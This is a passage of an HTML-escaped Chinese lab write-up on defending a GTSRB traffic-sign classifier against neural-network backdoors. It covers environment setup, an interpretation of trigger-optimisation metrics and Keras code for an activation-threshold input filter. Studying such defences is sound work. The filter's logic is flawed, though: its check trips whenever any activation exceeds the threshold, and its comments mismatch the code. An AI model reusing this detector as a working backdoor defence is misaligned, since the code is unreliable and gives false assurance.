class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;BIOS&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;版本/日期&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;American&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Megatrends&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;International,&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;LLC.&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;G533ZW.324,&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2023&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;/2/21&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;BIOS&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;模式&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;UEFI&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;主板产品&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;G533ZW&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;操作系统名称&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;11&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;家庭中文版&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;软件环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#软件环境&#34;&gt;#&lt;/a&gt; 软件环境&lt;/h3&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;支持 Pytorch深度学习框架、支持 Python &lt;span class=&#34;number&#34;&gt;3.5&lt;/span&gt;或更高版本的编程环境&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PyCharm &lt;span class=&#34;number&#34;&gt;2023.2&lt;/span&gt; 专业版&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3&lt;span class=&#34;number&#34;&gt;.6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;h5py                      &lt;span class=&#34;number&#34;&gt;3.1&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keras                     &lt;span class=&#34;number&#34;&gt;2.2&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.2&lt;/span&gt;                   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keras-applications        &lt;span class=&#34;number&#34;&gt;1.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.4&lt;/span&gt;                  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keras-preprocessing       &lt;span class=&#34;number&#34;&gt;1.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.2&lt;/span&gt;                    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;numpy                     &lt;span class=&#34;number&#34;&gt;1.14&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pillow                    &lt;span class=&#34;number&#34;&gt;8.4&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tensorflow-gpu                &lt;span class=&#34;number&#34;&gt;1.10&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tensorflow                &lt;span class=&#34;number&#34;&gt;1.10&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;开始实验&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#开始实验&#34;&gt;#&lt;/a&gt; 开始实验&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;由于实验所用环境为 python3.6，故我们先打开 Anaconda Prompt 后输入命令 &lt;code&gt;conda create -n py36 python=3.6&lt;/code&gt;  来创建一个名为 py36 的 python3.6 虚拟环境&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;win+R 后 cmd 进入先输入命令 conda init 来初始化 conda，退出后再次进入后输入命令 conda activate py36 来激活该 3.6 环境&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;然后运行命令 &lt;code&gt;conda install h5py=3.1.0 keras=2.2.2 keras-applications=1.0.4 keras-preprocessing=1.0.2 numpy=1.14.5 pillow=8.4.0 tensorflow=1.10.0 tensorflow-gpu=1.10.0&lt;/code&gt;  来安装指定的库&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 pycharm 里找到该虚拟环境的地址，然后选择系统解释器，此处我电脑上该 3.6 的解释器位于 F:\Anaconda\envs\py36\python.exe&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;运行 gtsrb_visualize_example.py 文件，发现环境配置成功&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/gh9oL71c4yqMHER.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在本章，我选择通过识别过滤后门输入来实现后门的防御，即建立神经元激活过滤器。激活值定义为第二层到最后一层中激活值排名前 1% 的神经元的平均激活值。过滤器将后门输入识别为那些激活值高于一定阈值的输入，模型将不对这些输入进行预测&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;分析原始输出：&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/mo93SkOYl7XJraQ.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;这一段输出结果来自于一个优化过程，其目的是调整和优化一个后门触发器在机器学习模型中的表现。分析时需要关注几个关键指标：成本（cost）、攻击成功率（attack）、总损失（loss）、分类损失（ce）、正则化损失（reg）以及最佳正则化损失（reg_best）。这些指标有助于评估触发器的效果和对模型的干扰程度。&lt;br&gt;
&lt;strong&gt;up cost from 1.60E-02 to 3.20E-02&amp;quot;&lt;/strong&gt;：成本系数从 0.016 提高到 0.032。这通常意味着在优化过程中，正则化损失对总损失的贡献被增加，目的是为了简化或减少触发器的复杂度，使其更难被检测。&lt;/p&gt;
&lt;p&gt;步骤 50 到 56 每一步的具体情况如下：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击成功率（Attack）&lt;/strong&gt;：这一指标在 0.979 到 0.994 之间波动，显示了触发器在这些步骤中的有效性。数值接近 1 表示高成功率。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;总损失（Loss）&lt;/strong&gt;：随着正则化损失和分类损失的变化而变化，反映了总体的优化效果。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;分类损失（CE）&lt;/strong&gt;：这一指标衡量的是触发器使模型在正常分类任务上的表现差异。数值较低表示触发器对模型正常功能的干扰较小。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;正则化损失（Reg）&lt;/strong&gt;：衡量触发器复杂度的指标，优化目标是减少这一值，使得触发器更难被发现。在这几步中，这一指标有所波动但整体趋势为逐步降低。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最佳正则化损失（Reg_best）&lt;/strong&gt;：在步骤 55 中，达到了 52.034966，这是观察期间的最低值，表示找到了一个相对简单且效果良好的触发器配置。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;现在开始后门防御的实现：&lt;br&gt;
设计 defense.py 代码如下&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; numpy &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; np&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; keras.models &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Model&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;NeuralFilter&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__init__&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, model&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# 提取模型的各层输出作为一个新模型的输出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.layer_outputs = [layer.output &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; layer &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; model.layers[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:]]  &lt;span class=&#34;comment&#34;&gt;# 从第二层到最后一层&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.activation_model = Model(inputs=model.&lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;, outputs=self.layer_outputs)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.thresholds = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;compute_activation_thresholds&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, training_data, percentile=&lt;span class=&#34;number&#34;&gt;99&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;在训练数据上计算每层的神经元激活阈值&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        activations = self.activation_model.predict(training_data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; layer_activations &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; activations:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# 对每层的激活值找到排名前1%的神经元的平均激活值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            flattened_activations = layer_activations.reshape(-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            threshold = np.percentile(flattened_activations, percentile)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            self.thresholds.append(threshold)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;filter_inputs&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, input_data&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;检查输入数据是否超过激活阈值，如果是，则认为是后门输入&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        activations = self.activation_model.predict(input_data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; layer_activations, threshold &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;zip&lt;/span&gt;(activations, self.thresholds):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# 比较激活值和阈值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; np.mean(layer_activations[layer_activations &amp;gt; threshold]) &amp;gt; threshold:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;后门输入检测到，不进行预测&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;\1. 在 gtsrb_visualize_example.py 代码中第 10 行添加代码 from defense import NeuralFilter。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;现在修改 gtsrb_visualize_label_scan_bottom_right_white_4 函数和 main 函数如下：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;gtsrb_visualize_label_scan_bottom_right_white_4&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    os.environ[&lt;span class=&#34;string&#34;&gt;&amp;quot;CUDA_VISIBLE_DEVICES&amp;quot;&lt;/span&gt;] = DEVICE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;loading dataset&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    X_test, Y_test = load_dataset()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    test_generator = build_data_loader(X_test, Y_test)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;loading model&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    model_file = &lt;span class=&#34;string&#34;&gt;f&amp;#x27;&lt;span class=&#34;subst&#34;&gt;&amp;#123;MODEL_DIR&amp;#125;&lt;/span&gt;/&lt;span class=&#34;subst&#34;&gt;&amp;#123;MODEL_FILENAME&amp;#125;&lt;/span&gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    model = load_model(model_file)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 初始化防御系统&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    neural_filter = NeuralFilter(model)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 使用测试集来计算阈值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    neural_filter.compute_activation_thresholds(X_test)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 初始化可视化器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    visualizer = Visualizer(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        model, intensity_range=INTENSITY_RANGE, regularization=REGULARIZATION,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        input_shape=INPUT_SHAPE,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        init_cost=INIT_COST, steps=STEPS, lr=LR, num_classes=NUM_CLASSES,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mini_batch=MINI_BATCH,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        upsample_size=UPSAMPLE_SIZE,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        attack_succ_threshold=ATTACK_SUCC_THRESHOLD,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        patience=PATIENCE, cost_multiplier=COST_MULTIPLIER,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        img_color=IMG_COLOR, batch_size=BATCH_SIZE, verbose=&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        save_last=SAVE_LAST,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        early_stop=EARLY_STOP, early_stop_threshold=EARLY_STOP_THRESHOLD,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        early_stop_patience=EARLY_STOP_PATIENCE)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; X_batch, Y_batch &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; test_generator:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# 假设我们只处理第一个标签，你可以根据实际情况调整这个逻辑&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        first_label = np.argmax(Y_batch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;])  &lt;span class=&#34;comment&#34;&gt;# 获取批次中第一个样本的目标类别&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;processing label %d&amp;#x27;&lt;/span&gt; % first_label)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; neural_filter.filter_inputs(X_batch):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            _, _, logs = visualizer.visualize(X_batch, first_label, save_pattern_flag=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;检测到潜在的后门攻击，已阻止此输入。&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    os.environ[&lt;span class=&#34;string&#34;&gt;&amp;quot;CUDA_VISIBLE_DEVICES&amp;quot;&lt;/span&gt;] = DEVICE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    utils_backdoor.fix_gpu_memory()  &lt;span class=&#34;comment&#34;&gt;# 假设这是调整GPU内存的工具函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span 